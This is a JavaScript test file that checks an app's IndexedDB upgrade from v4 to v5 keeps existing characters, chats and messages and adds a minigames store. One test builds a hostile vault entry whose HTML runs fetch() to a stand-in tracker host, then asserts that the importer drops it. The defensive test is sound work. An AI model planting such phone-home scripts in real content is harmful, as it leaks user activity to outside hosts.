/* Database upgrade test: exercises the v4 -> v5 path an EXISTING install
   takes, which the boot test cannot cover (it always opens an empty
   database). A real user who upgrades must keep every character, chat and
   message, and gain the new minigames store.
   Run with:  node tools/db-migrate.test.mjs */

let pass = 0;
let fail = 0;
const failures = [];

function ok(name, cond, extra) {
  if (cond) { pass++; return; }
  fail++;
  failures.push(name + (extra ? " :: " + extra : ""));
}
function eq(name, got, want) {
  ok(name, got === want, "got " + JSON.stringify(got) + " want " + JSON.stringify(want));
}

// A small IndexedDB stub that behaves like the real one for upgrades: it
// keeps a version and a set of stores, fires onupgradeneeded when the
// version goes up, and keeps rows across the upgrade. Indexes are modelled
// too, because the app reads through the compound chat_time index.
const registry = { version: 0, stores: new Map(), indexes: new Map(), counter: 0 };

// The index definitions js/db.js creates, so a pre-existing v4 database
// already has them. The shape matches createIndex(): {keyPath, unique}.
const INDEXES = {
  characters: { name: { keyPath: "name" }, created_at: { keyPath: "created_at" } },
  personas: { name: { keyPath: "name" }, is_default: { keyPath: "is_default" } },
  chats: { character_id: { keyPath: "character_id" }, updated_at: { keyPath: "updated_at" } },
  messages: {
    chat_id: { keyPath: "chat_id" },
    chat_time: { keyPath: ["chat_id", "timestamp"] },
    swipe_group_id: { keyPath: "swipe_group_id" }
  },
  lorebooks: { character_id: { keyPath: "character_id" } },
  presets: { name: { keyPath: "name" } },
  providers: { name: { keyPath: "name" } },
  regex_rules: { character_id: { keyPath: "character_id" } },
  stages: { key: { keyPath: "key" } },
  chat_stage_state: {
    chat_id: { keyPath: "chat_id" },
    chat_stage: { keyPath: ["chat_id", "stage_key"] }
  },
  minigames: { key: { keyPath: "key" }, author: { keyPath: "author" } }
};

function req(result) {
  const r = { result, onsuccess: null, onerror: null };
  setTimeout(() => r.onsuccess && r.onsuccess(), 0);
  return r;
}

function cmp(a, b) {
  return a < b ? -1 : a > b ? 1 : 0;
}

// A compound key is compared element by element against a bound range.
function inRange(key, range) {
  if (!range || range.a === undefined) return true;
  const k = Array.isArray(key) ? key : [key];
  const lo = Array.isArray(range.a) ? range.a : [range.a];
  const hi = Array.isArray(range.b) ? range.b : [range.b];
  for (let i = 0; i < lo.length; i++) {
    if (cmp(k[i], lo[i]) < 0) return false;
    if (cmp(k[i], hi[i]) > 0) return false;
  }
  return true;
}

function sameKey(key, value) {
  if (Array.isArray(key)) {
    if (!Array.isArray(value)) return false;
    return key.length === value.length && key.every((v, i) => v === value[i]);
  }
  return key === value;
}

function makeStore(name) {
  if (!registry.stores.has(name)) registry.stores.set(name, new Map());
  if (!registry.indexes.has(name)) registry.indexes.set(name, new Map());
  const m = registry.stores.get(name);
  const idx = registry.indexes.get(name);
  for (const [k, v] of Object.entries(INDEXES[name] || {})) idx.set(k, v);
  const keyOf = (row, def) => (Array.isArray(def) ? def.map((p) => row[p]) : row[def]);
  return {
    _m: m,
    createIndex(indexName, keyPath, opts) {
      idx.set(indexName, { keyPath, unique: !!(opts && opts.unique) });
    },
    index(indexName) {
      const def = idx.get(indexName);
      return {
        getAll(arg) {
          const rows = [...m.values()];
          if (!def) return req(rows);
          if (arg && typeof arg === "object" && arg.a !== undefined) {
            return req(rows.filter((r) => inRange(keyOf(r, def.keyPath), arg)));
          }
          return req(rows.filter((r) => sameKey(keyOf(r, def.keyPath), arg)));
        },
        get(value) {
          const rows = [...m.values()].filter((r) => sameKey(keyOf(r, def.keyPath), value));
          return req(rows[0]);
        }
      };
    },
    getAll: () => req([...m.values()]),
    get: (k) => req(m.get(k)),
    put(v) {
      if (v.id == null) v.id = ++registry.counter;
      m.set(v.id, v);
      return req(v.id);
    },
    delete: (k) => { m.delete(k); return req(undefined); },
    clear: () => { m.clear(); return req(undefined); },
    count: () => req(m.size)
  };
}

// ---- set the world to "a v4 install that already has data" ----
const V4_STORES = ["characters", "personas", "chats", "messages", "lorebooks",
  "presets", "providers", "regex_rules", "stages", "chat_stage_state"];
registry.version = 4;
for (const n of V4_STORES) {
  const m = new Map();
  registry.stores.set(n, m);
}
registry.stores.get("characters").set(1, {
  id: 1, name: "Rin", description: "a keeper of lanterns", created_at: 111
});
registry.stores.get("personas").set(1, {
  id: 1, name: "You", description: "", is_default: 1
});
registry.stores.get("chats").set(1, {
  id: 1, character_id: 1, persona_id: 1, title: "Old chat", created_at: 111, updated_at: 111
});
registry.stores.get("messages").set(1, {
  id: 1, chat_id: 1, role: "user", content: "hello from v4", timestamp: 111
});

// A transaction has to fire oncomplete, or every write in db.js hangs on
// its promise and the test would quietly pass without exercising anything.
function makeTx(name, fresh) {
  const tx = { oncomplete: null, onerror: null, onabort: null, _pending: 0, _done: false };
  const settle = () => {
    if (tx._pending > 0 || tx._done) return;
    tx._done = true;
    setTimeout(() => tx.oncomplete && tx.oncomplete(), 0);
  };
  tx.objectStore = (nm) => {
    const store = fresh[nm] || makeStore(nm);
    for (const op of ["put", "delete", "clear"]) {
      const orig = store[op].bind(store);
      store[op] = (...args) => {
        tx._pending++;
        const r = orig(...args);
        // Fires after the request's own callback, so db.js has already
        // attached its oncomplete listener by then.
        setTimeout(() => { tx._pending--; settle(); }, 0);
        return r;
      };
    }
    return store;
  };
  return tx;
}

globalThis.indexedDB = {
  open(dbName, version) {
    const r = { onupgradeneeded: null, onsuccess: null, onerror: null, onblocked: null, result: null };
    setTimeout(() => {
      const oldVersion = registry.version;
      const fresh = {};
      const db = {
        objectStoreNames: { contains: (n) => registry.stores.has(n) },
        createObjectStore: (n) => {
          const s = makeStore(n);
          fresh[n] = s;
          return s;
        },
        transaction: (n) => makeTx(n, fresh),
        close() {}
      };
      r.result = db;
      if (version > oldVersion) {
        registry.version = version;
        if (r.onupgradeneeded) {
          r.onupgradeneeded({ oldVersion, newVersion: version, target: db });
        }
      }
      if (r.onsuccess) r.onsuccess();
    }, 0);
    return r;
  }
};
globalThis.IDBKeyRange = { bound: (a, b) => ({ a, b }) };

const db = await import("../js/db.js");

// ---- the upgrade itself ----
await db.openDB();
eq("the database is on the new version", registry.version, 5);
ok("the new minigames store was created", registry.stores.has("minigames"));

// ---- the old data survived ----
const chars = await db.listCharacters();
eq("the old character survived", chars.length, 1);
eq("the character is intact", chars[0].name, "Rin");
const personas = await db.listPersonas();
eq("the old persona survived", personas.length, 1);
const chats = await db.listChats();
eq("the old chat survived", chats.length, 1);
eq("the old chat title is intact", chats[0].title, "Old chat");
const msgs = await db.listMessages(1);
eq("the old message survived", msgs.length, 1);
eq("the old message content is intact", msgs[0].content, "hello from v4");

// ---- the new store works ----
const games = await db.listMinigames();
eq("the new store starts empty", games.length, 0);
const id = await db.saveMinigame({
  key: "cauldron", name: "Cauldron", desc: "brew things",
  html: "<script>Polyglot.report('x')</script>", author: "forge"
});
ok("a minigame can be saved", id > 0);
const back = await db.getMinigame("cauldron");
ok("the minigame can be read back", !!back);
eq("the minigame key is intact", back.key, "cauldron");
eq("the minigame html is intact", back.html, "<script>Polyglot.report('x')</script>");

// ---- the session state ----
await db.saveStageState(1, "minigame:cauldron", { active: 1, data: { pot: 3 } }, {});
const states = await db.listStageStates(1);
ok("a minigame session is stored with the stage states",
  states.some((s) => s.stage_key === "minigame:cauldron"),
  JSON.stringify(states.map((s) => s.stage_key)));
const st = await db.getStageState(1, "minigame:cauldron");
ok("the session can be read back", !!st, "got " + JSON.stringify(st));
if (st) eq("the session state is intact", st.state.data.pot, 3);

// ---- the vault round trip carries the new store ----
const vault = await db.exportVaultToJSON({ includeKeys: false });
ok("the vault has a minigames table", Array.isArray(vault.tables.minigames));
eq("the vault carries the game", vault.tables.minigames.length, 1);
ok("the vault keeps the old character", vault.tables.characters.length === 1);

// ---- a hostile vault must not install a phone-home game ----
const hostile = JSON.parse(JSON.stringify(vault));
hostile.tables.minigames.push({
  key: "evil", name: "Evil", desc: "",
  html: "<script>fetch('http://tracker.invalid/p');Polyglot</script>", author: "user"
});
const res = await db.importVaultFromJSON(hostile, { merge: false });
ok("the hostile game was reported as dropped", (res.droppedGames || []).some((d) => d.includes("evil")),
  JSON.stringify(res.droppedGames));
const after = await db.listMinigames();
ok("the hostile game was not installed", !after.some((g) => g.key === "evil"), JSON.stringify(after.map((g) => g.key)));
ok("the good game still imported", after.some((g) => g.key === "cauldron"));

// ---- a legacy vault without the table still imports ----
const legacy = JSON.parse(JSON.stringify(vault));
delete legacy.tables.minigames;
await db.importVaultFromJSON(legacy, { merge: false });
ok("a legacy vault still imports", (await db.listCharacters()).length === 1);

// ---- report ----

console.log("PASS " + pass);
if (fail) {
  console.log("FAIL " + fail);
  for (const f of failures) console.log("  - " + f);
  process.exit(1);
}
console.log("DB_MIGRATE_TESTS_OK");
